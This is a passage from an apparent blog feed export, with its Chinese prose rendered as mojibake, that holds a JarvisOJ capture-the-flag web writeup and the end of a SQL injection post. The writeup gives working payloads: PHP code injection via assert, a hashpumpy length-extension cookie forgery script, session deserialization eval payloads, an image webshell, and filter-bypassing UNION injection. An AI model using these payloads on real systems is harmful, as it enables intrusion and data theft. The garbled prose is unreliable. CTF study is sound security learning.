¹æ®é¡µé¢å›æ˜¾å†…å®¹ä¸åŒæ¥åˆ¤æ–­çš„ï¼Œè€Œæ—¶é—´ç›²æ³¨ä¸éœ€è¦åœ¨æ„è¿™ä¸€ç‚¹ï¼Œåªéœ€åˆ¤æ–­å“åº”æ—¶é—´å°±è¡Œ</p><p>ä¸€èˆ¬ç”¨ä¸‹é¢çš„æ¨¡æ¿å°±å¯ä»¥è§£å†³</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">try:</span><br><span class="line">payload&#x3D; &#39;*** and ascii(substr(***,1,1))&#x3D;*%23&#39;</span><br><span class="line">r&#x3D;requests.get(url+payload)</span><br><span class="line"> if &quot;***&quot; in r.text:</span><br><span class="line">        data+char(j)</span><br><span class="line">except Exceptions as e:</span><br><span class="line">break</span><br></pre></td></tr></table></figure><h3 id="æŠ¥é”™æ³¨å…¥"><a href="#æŠ¥é”™æ³¨å…¥" class="headerlink" title="æŠ¥é”™æ³¨å…¥"></a>æŠ¥é”™æ³¨å…¥</h3><p>è¿™ä¸ªå¥½åƒæœ‰ç‚¹å¤šï¼Œå•ç‹¬å†™ä¸€ç¯‡åšå®¢æ€»ç»“ä¸€ä¸‹ï¼š<a href="https://www.moonback.xyz/2019/10/25/mysql-wrong-injection/">https://www.moonback.xyz/2019/10/25/mysql-wrong-injection/</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> sqlæ³¨å…¥ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>jarvisoj webéƒ¨åˆ†writeup</title>
      <link href="2019/10/05/jarvisoj-web-wp/"/>
      <url>2019/10/05/jarvisoj-web-wp/</url>
      
        <content type="html"><![CDATA[<p>æœ¬ç¯‡åšå®¢ä»‹ç»äº†jarvisOJä¸Šwebéƒ¨åˆ†é¢˜writeupï¼ï¼ï¼</p><a id="more"></a><h2 id="61dctf-babyphp"><a href="#61dctf-babyphp" class="headerlink" title="[61dctf]babyphp"></a>[61dctf]babyphp</h2><p>æ‰“å¼€é¢˜ç›®å‘ç°æç¤ºgitæ­å»ºçš„ï¼Œæœ‰æ²¡æœ‰æºç æ³„éœ²ï¼Ÿ</p><p>githackè·‘ä¸‹ï¼Œå¾—åˆ°æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line">$page = $_GET[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">$page = <span class="string">&quot;home&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$file = <span class="string">&quot;templates/&quot;</span> . $page . <span class="string">&quot;.php&quot;</span>;</span><br><span class="line">assert(<span class="string">&quot;strpos(&#x27;<span class="subst">$file</span>&#x27;, &#x27;..&#x27;) === false&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Detected hacking attempt!&quot;</span>);</span><br><span class="line">assert(<span class="string">&quot;file_exists(&#x27;<span class="subst">$file</span>&#x27;)&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;That file doesn&#x27;t exist!&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ä»æ³„éœ²é‡Œå¯ä»¥çœ‹åˆ°æœ‰<code>flag.php</code>ï¼ŒçŒœæµ‹flagåœ¨é‡Œé¢</p><p>ä»æºç é‡Œå¯ä»¥çœ‹åˆ°å¯ä»¥ä»£ç æ‰§è¡Œ</p><p><strong>payload:</strong></p><pre><code>?page=&#39;^system(&#39;cat templates/flag.php&#39;)^&#39;</code></pre><p>å¾—åˆ°flag</p><h2 id="61dctf-admin"><a href="#61dctf-admin" class="headerlink" title="[61dctf]admin"></a>[61dctf]admin</h2><p>æ‰“å¼€é¢˜ç›®ç½‘å€ï¼š</p><p><img src="/2019/10/05/jarvisoj-web-wp/20190805174242.png"></p><p>dirsearchä¸€æ‰«</p><p><img src="/2019/10/05/jarvisoj-web-wp/20190805174301.png"></p><p>è®¿é—®robots.txt</p><p><img src="/2019/10/05/jarvisoj-web-wp/20190805174319.png"></p><p>è®¿é—®æç¤ºçš„å†…å®¹</p><p><img src="/2019/10/05/jarvisoj-web-wp/20190805174340.png"></p><p>flagå‡ºæ¥äº†ï¼Ÿé‚£ä¹ˆç®€å•ï¼Ÿå°±æ˜¯é‚£ä¹ˆç®€å•</p><h2 id="LOCALHOST"><a href="#LOCALHOST" class="headerlink" title="LOCALHOST"></a>LOCALHOST</h2><p>æ‰“å¼€é¢˜ç›®ç½‘å€ï¼š</p><p><img src="/2019/10/05/jarvisoj-web-wp/20190805144450.png"></p><p>ä»…æœ¬æœºè®¿é—®ï¼Œç«‹åˆ»æƒ³åˆ°æŠ“åŒ…æ”¹XFF</p><p><img src="/2019/10/05/jarvisoj-web-wp/20190805144941.png"></p><p>flagå°±è¿™æ ·å‡ºæ¥äº†ï¼Œæ˜¯ä¸æ˜¯å¾ˆç®€å•ï¼Ÿå°±æ˜¯è¿™æ ·ç®€å•</p><pre><code>PCTF&#123;X_F0rw4rd_F0R_is_not_s3cuRe&#125; </code></pre><h2 id="flagåœ¨ç®¡ç†å‘˜æ‰‹é‡Œ"><a href="#flagåœ¨ç®¡ç†å‘˜æ‰‹é‡Œ" class="headerlink" title="flagåœ¨ç®¡ç†å‘˜æ‰‹é‡Œ"></a>flagåœ¨ç®¡ç†å‘˜æ‰‹é‡Œ</h2><p>æ‰“å¼€æç¤º<code>Only Admin can see the flag!!</code></p><p>æŠ“åŒ…çœ‹ä¸‹ï¼Œå¾ˆæ˜æ˜¾é—®é¢˜çš„å…¥æ‰‹ç‚¹åœ¨Cookieè¿™é‡Œ</p><p><img src="/2019/10/05/jarvisoj-web-wp/20191213221259.png"></p><p>urlè§£ç å‘ç°æ˜¯</p><p><img src="/2019/10/05/jarvisoj-web-wp/20191213221518.png"></p><p>æ”¹ä¸‹guesté‡æ–°å‘åŒ…å‘ç°æ²¡ååº”ï¼Œåº”è¯¥å’Œhshæœ‰å…³ç³»</p><p>æ²¡ä»€ä¹ˆæ€è·¯ï¼Œå°±æ‰«ä¸‹è·¯å¾„å§ï¼Œdirsearchæ‰«åˆ°å¤‡ä»½æ–‡ä»¶<code>index.php~</code>ï¼Œä½†æ‰“å¼€å‘ç°ä¸èƒ½çœ‹åˆ°æºç </p><p>çŒœæµ‹æ˜¯viå¼‚å¸¸é€€å‡ºçš„æ–‡ä»¶ï¼Œç¬¬ä¸€æ¬¡å¼‚å¸¸é€€å‡ºä¼šäº§ç”Ÿä¸€ä¸ª<code>*.swp</code>ï¼Œå†æ¬¡æ„å¤–é€€å‡ºåï¼Œå°†ä¼šäº§ç”Ÿåä¸º<code>*.swo</code>çš„äº¤æ¢æ–‡ä»¶ï¼›è€Œç¬¬ä¸‰æ¬¡äº§ç”Ÿçš„äº¤æ¢æ–‡ä»¶åˆ™ä¸º<code>*.swn</code>çš„æ–‡ä»¶ï¼Œä¾æ­¤ç±»æ¨ã€‚</p><p>å¯ä»¥ç›´æ¥ç”¨<code>vim -r</code>æ¢å¤æ–‡ä»¶</p><p><img src="/2019/10/05/jarvisoj-web-wp/20191213221518.png"></p><p>æ¢å¤å‡ºæ¥çš„å…³é”®ä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$auth = <span class="literal">false</span>;</span><br><span class="line">$role = <span class="string">&quot;guest&quot;</span>;</span><br><span class="line">$salt = </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_COOKIE[<span class="string">&quot;role&quot;</span>])) &#123;</span><br><span class="line">$role = unserialize($_COOKIE[<span class="string">&quot;role&quot;</span>]);</span><br><span class="line">$hsh = $_COOKIE[<span class="string">&quot;hsh&quot;</span>];</span><br><span class="line"><span class="keyword">if</span> ($role===<span class="string">&quot;admin&quot;</span> &amp;&amp; $hsh === md5($salt.strrev($_COOKIE[<span class="string">&quot;role&quot;</span>]))) &#123;</span><br><span class="line">$auth = <span class="literal">true</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">$auth = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">$s = serialize($role);</span><br><span class="line">setcookie(<span class="string">&#x27;role&#x27;</span>,$s);</span><br><span class="line">$hsh = md5($salt.strrev($s));</span><br><span class="line">setcookie(<span class="string">&#x27;hsh&#x27;</span>,$hsh);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ($auth) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h3&gt;Welcome Admin. Your flag is </span></span><br><span class="line"><span class="string">&#125; else &#123;</span></span><br><span class="line"><span class="string">echo &quot;</span>&lt;h3&gt;Only Admin can see the flag!!&lt;/h3&gt;<span class="string">&quot;;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™æ®µä»£ç çš„æ„æ€å°±æ˜¯ååºåˆ—åŒ–Cookieé‡Œçš„roleï¼Œå°†salt(æœªçŸ¥)å’Œåè½¬åçš„roleæ‹¼æ¥ä¸€èµ·å¹¶MD5åŠ å¯†ï¼Œç„¶åä¸Cookieé‡Œçš„hashæ¯”è¾ƒï¼Œç›¸ç­‰å°±ä¼šè¾“å‡ºflag</p><p>è¿™å°±è¦ç”¨åˆ°hashæ‰©å±•æ”»å‡»çš„çŸ¥è¯†å‚è§æˆ‘çš„å¦å¤–ä¸€ç¯‡åšå®¢ï¼š<a href="https://www.moonback.xyz/2019/12/16/hash-extend-attack/">https://www.moonback.xyz/2019/12/16/hash-extend-attack/</a></p><p>ç”±äºæˆ‘ä»¬ä¸çŸ¥é“$saltçš„é•¿åº¦ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å¯¹å…¶é•¿åº¦çˆ†ç ´ï¼Œçˆ†ç ´ä¹‹å‰ï¼Œæˆ‘ä»¬éœ€è¦çŸ¥é“çš„æ˜¯ååºåˆ—åŒ–å‡½æ•°å­˜åœ¨00æˆªæ–­ï¼Œä¸ºä¿è¯<code>$role===&quot;admin&quot;</code>ï¼Œæˆ‘ä»¬å¿…é¡»<code>s:5:&quot;guest&quot;;</code>åœ¨å‰é¢ï¼Œæ³¨æ„æœåŠ¡ç«¯åœ¨md5åŠ å¯†çš„æ˜¯åè½¬çš„roleçš„é”®å€¼ã€‚æ‰€ä»¥æˆ‘ä»¬æ„é€ çš„payloadåº”è¯¥ä¸ºä»¥ä¸‹å†…å®¹ï¼Œæœ€ç»ˆçŸ¥é“saltçš„é•¿åº¦ä¸º12(0c)</p><p><img src="/2019/10/05/jarvisoj-web-wp/0191230142702.png"></p><p>è¿™é‡Œæœ‰ä¸ªè„šæœ¬ï¼Œéœ€è¦è£…ä¸ªhashpumpyåº“</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashpumpy</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://web.jarvisoj.com:32778/&#x27;</span></span><br><span class="line">hsh=<span class="string">&#x27;3a4727d57463f122833d9e732f94e4e0&#x27;</span></span><br><span class="line">s1=<span class="string">&#x27;&#x27;&#x27;s:5:&quot;guest&quot;;&#x27;&#x27;&#x27;</span></span><br><span class="line">s2=<span class="string">&#x27;&#x27;&#x27;s:5:&quot;admin&quot;;&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">m=hashpumpy.hashpump(hsh,s1[::<span class="number">-1</span>],s2[::<span class="number">-1</span>],i)</span><br><span class="line">    <span class="comment"># å››ä¸ªå‚æ•°åˆ†åˆ«ä¸º hashå€¼ secretåçš„å­—ç¬¦ä¸² æ›´æ”¹åsecretåçš„å­—ç¬¦ä¸² secretçš„é•¿åº¦ </span></span><br><span class="line"><span class="keyword">print</span> i</span><br><span class="line">Cookie=<span class="string">&quot;role=&quot;</span>+urllib.quote(urllib.unquote(m[<span class="number">1</span>])[::<span class="number">-1</span>])+<span class="string">&quot;; hsh=&quot;</span>+m[<span class="number">0</span>]</span><br><span class="line">headers=&#123;<span class="string">&quot;Cookie&quot;</span>:Cookie&#125;</span><br><span class="line">r=requests.get(url,headers=headers)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;Welcome&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line"><span class="keyword">print</span> r.text;</span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="PHPINFO"><a href="#PHPINFO" class="headerlink" title="PHPINFO"></a>PHPINFO</h2><p>æ‹¿åˆ°é¢˜æ˜¯è¿™æ ·çš„</p><p><img src="/2019/10/05/jarvisoj-web-wp/20191105200834.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;&#x2F;A webshell is wait for you</span><br><span class="line">ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);</span><br><span class="line">session_start();</span><br><span class="line">class OowoO</span><br><span class="line">&#123;</span><br><span class="line">    public $mdzz;</span><br><span class="line">    function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;mdzz &#x3D; &#39;phpinfo();&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        eval($this-&gt;mdzz);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_GET[&#39;phpinfo&#39;]))</span><br><span class="line">&#123;</span><br><span class="line">    $m &#x3D; new OowoO();</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">    highlight_string(file_get_contents(&#39;index.php&#39;));</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>æ—¢ç„¶é¢˜ç›®å‘Šè¯‰æˆ‘ä»¬phpinfo,æˆ‘ä»¬å°±å°è¯•è®¿é—®ä¸€ä¸‹,å‘ç°æœç„¶å­˜åœ¨</p><p>ä»phpinfoèƒ½çœ‹å‡ºæ¥å¥½å¤šä¸œè¥¿ï¼Œè¿™é‡Œå°±ä¸ç»•å¼¯å­äº†</p><p>æœ¬é¢˜è€ƒå¯Ÿçš„å°±æ˜¯sessionååºåˆ—åŒ–çš„çŸ¥è¯†</p><p><img src="/2019/10/05/jarvisoj-web-wp/20191105201933.png"></p><p><code>session.save_path</code>æ˜¯æŒ‡sessionçš„å­˜å‚¨è·¯å¾„ï¼Œå¦‚æœæ˜¯<code>no value</code>ï¼Œé‚£ä¹ˆå°†ä¼šæ˜¯é»˜è®¤è·¯å¾„<code>/tmp/sess_**</code></p><p><code>session.serialize_handler</code>æ˜¯æŒ‡sessionçš„åºåˆ—åŒ–å¼•æ“ã€‚<code>Master Value</code>æ˜¯PHP.iniæ–‡ä»¶ä¸­çš„å†…å®¹ï¼Œ<code>Local value</code> æ˜¯å½“å‰ç›®å½•ä¸­çš„è®¾ç½®ï¼Œè¿™ä¸ªå€¼ä¼šè¦†ç›–<code>Master Value</code>ä¸­å¯¹åº”çš„å€¼</p><p><code>session.upload_progress.cleanup</code>è¿™ä¸ªæ˜¯æŒ‡sessionä¸Šä¼ è¿›åº¦æ˜¯å¦è‡ªåŠ¨æ¸…é™¤çš„é€‰é¡¹</p><p>å¯ä»¥çœ‹ä¸‹<a href="https://www.php.net/manual/zh/session.upload-progress.php">æ‰‹å†Œ</a></p><p><img src="/2019/10/05/jarvisoj-web-wp/20191105203115.png"></p><p>å¤§æ¦‚æ„æ€å°±æ˜¯ï¼Œå¦‚æœsessionä¸Šä¼ è¿›åº¦å¼€å¯çš„è¯ï¼Œå¯ä»¥POSTä¸€ä¸ª<code>PHP_SESSION_UPLOAD_PROGRESS</code>å˜é‡ï¼Œä¸Šä¼ è¿›åº¦ä¼šä¿å­˜åœ¨<code>$_SESSION</code>ä¸­ï¼Œç„¶åé€šè¿‡phpåºåˆ—åŒ–å¼•æ“çš„ä¸åŒæ¥å¯¼è‡´æ¼æ´ï¼ˆsessionçš„å†™å…¥ä¼šåºåˆ—åŒ–ï¼Œsessionçš„è¯»å–ä¼šååºåˆ—åŒ–ï¼‰</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class OowoO</span><br><span class="line">&#123;</span><br><span class="line">    public $mdzz;</span><br><span class="line">    function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;mdzz &#x3D; &#39;æ¶æ„ä»£ç &#39;;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        eval($this-&gt;mdzz);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a&#x3D;new OowoO();</span><br><span class="line">echo serialize($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>åºåˆ—åŒ–çš„ç»“æœ</p><pre><code>O:5:&quot;OowoO&quot;:1:&#123;s:4:&quot;mdzz&quot;;s:16:&quot;æ¶æ„ä»£ç &quot;;&#125;    //é•¿åº¦ä¿®æ”¹ä¸‹</code></pre><p>è¿™é‡Œæˆ‘ä»¬ç”¨ä¸‹é¢è¿™ä¸ªç½‘é¡µæ„é€ </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action&#x3D;&quot;http:&#x2F;&#x2F;web.jarvisoj.com:32784&#x2F;index.php&quot; method&#x3D;&quot;POST&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value&#x3D;&quot;123&quot; &#x2F;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;file&quot; &#x2F;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;submit&quot; &#x2F;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br></pre></td></tr></table></figure><p>æŠ“åŒ…å¯ä»¥çœ‹åˆ°</p><p><img src="/2019/10/05/jarvisoj-web-wp/20191105230429.png"></p><p>ä»phpinfoå¯ä»¥çœ‹åˆ°ç½‘ç«™è·¯å¾„æ˜¯<code>/opt/lampp/htdocs</code>ï¼Œç„¶ååœ¨<code>filename</code>æ’å…¥ååºåˆ—åŒ–çš„å†…å®¹</p><pre><code>|O:5:\&quot;OowoO\&quot;:1:&#123;s:4:\&quot;mdzz\&quot;;s:36:\&quot;print_r(scandir(dirname(__FILE__)));\&quot;;&#125;</code></pre><p><img src="/2019/10/05/jarvisoj-web-wp/20191105230751.png"></p><pre><code>|O:5:\&quot;OowoO\&quot;:1:&#123;s:4:\&quot;mdzz\&quot;;s:88:\&quot;print_r(file_get_contents(\&quot;/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php\&quot;));\&quot;;&#125;</code></pre><p><img src="/2019/10/05/jarvisoj-web-wp/20191105230850.png"></p><h2 id="apiè°ƒç”¨"><a href="#apiè°ƒç”¨" class="headerlink" title="apiè°ƒç”¨"></a>apiè°ƒç”¨</h2><p>è¿™é¢˜å°±æ˜¯ä¸€ä¸ªç®€å•çš„xxe</p><p>æŠ“åŒ…å°†<code>Content-Type</code>æ”¹æˆ<code>application/xml</code>ï¼ŒPOSTåŒºæ·»åŠ è€Œå·²xmlå°±è¡Œ</p><p><img src="/2019/10/05/jarvisoj-web-wp/20191216161236.png"></p><h2 id="Easy-Gallery"><a href="#Easy-Gallery" class="headerlink" title="Easy Gallery"></a>Easy Gallery</h2><p>æ‰“å¼€é¢˜ç›®ï¼Œå‘ç°æœ‰ä¸‰ä¸ªé¡µé¢</p><p>åˆ‡æ¢ä¸€ä¸‹å‘ç°æœ‰pageè¿™ä¸ªå‚æ•°ï¼Œç¬é—´æƒ³åˆ°äº†æ–‡ä»¶åŒ…å«</p><p>è¯•è¯•index.php</p><p><img src="/2019/10/05/jarvisoj-web-wp/20191216155606.png"></p><p>å‘ç°æ˜¯fopenå‡½æ•°ï¼Œæƒ³åˆ°äº†%00æˆªæ–­ï¼Œè¯•è¯•å§</p><p>æ„é€ ç±»ä¼¼çš„payloadï¼š</p><pre><code>index.php?page=uploads/1576482315.gif%00</code></pre><p>ä¸Šä¼ ä¸€ä¸ªgif/jpgå›¾ç‰‡é©¬ï¼Œå‘ç°</p><p><img src="/2019/10/05/jarvisoj-web-wp/20191216160332.png"></p><p>å¯¹<code>&lt;?php</code>æˆ–<code>?&gt;</code>åšäº†è¿‡æ»¤?</p><p>è¯•è¯•<code>&lt;script language=&#39;php&#39;&gt;&lt;/script&gt;</code>å§</p><p><img src="/2019/10/05/jarvisoj-web-wp/20191216160559.png"></p><p>å¾—åˆ°flagï¼Œæ„Ÿè§‰ViewåŠŸèƒ½éƒ½æ²¡ç”¨ä¸Š2333â€¦..</p><h2 id="IN-A-Mess"><a href="#IN-A-Mess" class="headerlink" title="IN A Mess"></a>IN A Mess</h2><p>æ‰“å¼€é¢˜ç›®ç½‘å€ï¼š</p><p><img src="/2019/10/05/jarvisoj-web-wp/20190805154705.png"></p><p>çœ‹åˆ°id=1ï¼Œç¬¬ä¸€æ—¶é—´æƒ³åˆ°æ³¨å…¥ï¼Œå¾ˆå¯æƒœä¸æ˜¯æ³¨å…¥</p><p>æŸ¥çœ‹æºä»£ç çœ‹åˆ°æœ‰ä¸ªæç¤ºï¼Œè®¿é—®ä¸€ä¸‹</p><p>å¾—åˆ°ä¸€å¤§ä¸²ä»£ç ï¼Œæ’ç‰ˆä¸€ä¸‹</p><p><img src="/2019/10/05/jarvisoj-web-wp/20190805155051.png"></p><p>ä¼ å…¥ä¸‰ä¸ªå‚æ•°ï¼Œid,a,b</p><p>idå€¼ç­‰äº0ä½†è‡ªèº«ä¸èƒ½ä¸º0,å¯ä»¥å¼±ç±»å‹æ¯”è¾ƒ</p><p>aæ¶‰åŠfile_get_contentsï¼Œéœ€ç”¨ä¼ªåè®®<code>php://input</code>ä¼ å…¥â€<code>1112 is a nice lab!</code>â€</p><p>bé•¿åº¦å¤§äº5ä¸”å¯èƒ½æ¶‰åŠeregiç»•è¿‡ï¼Œå¯ä»¥ç”¨%00æˆªæ–­</p><pre><code>payload1:?id=0.&amp;a=php://input&amp;b=%000x34aa  å¹¶postä¸ª1112 is a nice lab!payload2:?id=0e&amp;a=data:,1112 is a nice lab!&amp;b=%00411111</code></pre><p>å…³äºpayload2ä¸­data:åä¸ºä»€ä¹ˆæœ‰é€—å·ï¼Œå…·ä½“å‚è§ï¼š<br><a href="https://blog.csdn.net/qq1045553189/article/details/87479691">https://blog.csdn.net/qq1045553189/article/details/87479691</a></p><p><img src="/2019/10/05/jarvisoj-web-wp/20190805161344.png"></p><p>æœ¬ä»¥ä¸ºå¾—åˆ°äº†flag,æäº¤å‘ç°é”™è¯¯ï¼Œå†çœ‹çœ‹500å¤§åˆ†çš„é¢˜ï¼Œåº”è¯¥ä¸ä¼šé‚£ä¹ˆç®€å•ï¼Œ<br>å†æˆ˜</p><p>ä¹Ÿä¸ç»•å¼¯å­äº†ï¼Œç›´æ¥è®¿é—®æˆ‘ä»¬æˆ‘ä»¬å¾—åˆ°çš„ä¿¡æ¯ï¼Œæœç„¶æœ‰è¿™ä¸ªç½‘é¡µï¼Œä¸è¦é—®æˆ‘ä¸ºä»€ä¹ˆ&gt;_&lt;</p><p><img src="/2019/10/05/jarvisoj-web-wp/20190805161938.png"></p><p>åˆçœ‹åˆ°id=1äº†ï¼Œå†æ¬¡æƒ³åˆ°æ³¨å…¥ï¼Œè¿™æ¬¡å¯¹äº†ï¼ŒåŠ ä¸ª/,å‘ç°</p><p><img src="/2019/10/05/jarvisoj-web-wp/20190805162126.png"></p><p>å°è¯•id=2-1,å‘ç°è¿”å›è¿˜æ˜¯id=1çš„ç»“æœï¼Œè¯´æ˜ä»£å…¥æ‰§è¡Œäº†ï¼Œå­˜åœ¨æ³¨å…¥<br>å›æ˜¾ä¸ºå¦‚æœæ£€æµ‹åˆ°æ³¨å…¥å°±è¿”å›you bad boy/girl!ï¼Œå¦‚æœæ‰§è¡Œäº†æŸ¥è¯¢ä¸åˆ°ç»“æœå°±è¿”å›æ‰§è¡Œè¯­å¥</p><p>order by åˆ¤æ–­åˆ—æ•°ï¼Œå‘ç°è¢«è¿‡æ»¤äº†ï¼Œ</p><p><img src="/2019/10/05/jarvisoj-web-wp/20190805163827.png"></p><p>å°†ç©ºæ ¼æ›¿æ¢æˆ/**/å‘ç°ä¹Ÿè¢«è¿‡æ»¤äº†ï¼Œå°†ç©ºæ ¼æ›¿æ¢ä¸º/<em>1</em>/ï¼Œè¿”å›hi666</p><p>å½“ä¸º4æ—¶æŠ¥é”™ï¼Œåªæœ‰ä¸‰åˆ—ï¼Œè”åˆæŸ¥è¯¢åˆ¤æ–­å›æ˜¾ä½ï¼Œå‘ç°å‘ç°union,select,froméƒ½è¢«æ›¿æ¢ä¸ºç©ºäº†ï¼ŒåŒå†™å³å¯ç»•è¿‡</p><pre><code>?id=-1/*1*/ununionion/*1*/selselectect/*1*/1,database(),3%23</code></pre><p>æ‰§è¡Œå‘ç°å›æ˜¾3ï¼Œè¯´æ˜ç¬¬ä¸‰ä¸ªä½ç½®ä¸ºå›æ˜¾ä½</p><pre><code>?id=-1/*1*/ununionion/*1*/selselectect/*1*/1,2,database()%23</code></pre><p>çˆ†å‡ºæ•°æ®åº“test</p><pre><code>?        id=-1/*1*/ununionion/*1*/selselectect/*1*/1,2,group_concat(table_name)/*1*/frfromom/*1*/information_schema.tables/*1*/where/*1*/table_schema=database()%23</code></pre><p>çˆ†å‡ºè¡¨ä¸ºcontent</p><pre><code>?id=-1/*1*/ununionion/*1*/selselectect/*1*/1,2,group_concat(column_name)/*1*/frfromom/*1*/information_schema.columns/*1*/where/*1*/table_schema=database()#</code></pre><p>çˆ†å‡ºå­—æ®µid,context,title</p><pre><code>?id=-1/*1*/ununionion/*1*/selselectect/*1*/1,2,group_concat(id,0x23,context,0x23,title)/*1*/frfromom/*1*/test.content#</code></pre><p><img src="/2019/10/05/jarvisoj-web-wp/20190805173153.png"></p><pre><code>PCTF&#123;Fin4lly_U_got_i7_C0ngRatulation5&#125;</code></pre><h2 id="ç¥ç›¾å±€çš„ç§˜å¯†"><a href="#ç¥ç›¾å±€çš„ç§˜å¯†" class="headerlink" title="ç¥ç›¾å±€çš„ç§˜å¯†"></a>ç¥ç›¾å±€çš„ç§˜å¯†</h2><p>æ‰“å¼€é¢˜ç›®ï¼Œå‘ç°æ˜¯ä¸€å¼ å›¾ç‰‡ï¼ŒCtrl+UæŸ¥çœ‹æºç å‘ç°</p><p><img 